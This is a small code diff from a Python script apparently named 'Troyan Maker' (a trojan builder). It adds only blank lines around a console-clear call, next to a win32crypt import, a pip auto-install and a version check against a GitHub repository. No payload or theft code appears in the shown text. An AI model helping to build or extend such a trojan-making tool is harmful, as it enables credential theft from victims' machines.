@@ -38,7 +38,9 @@ try:
     import win32crypt
 except:
     os.system(f"{sys.executable} -m pip install pypiwin32")
+
     os.system("cls")
+
 def build():
     version = requests.get("https://raw.githubusercontent.com/KentMGR/TroyanMaker/main/Files/version")
     ctypes.windll.kernel32.SetConsoleTitleW(f"Troyan Maker | Version {version.text} | By Kent")
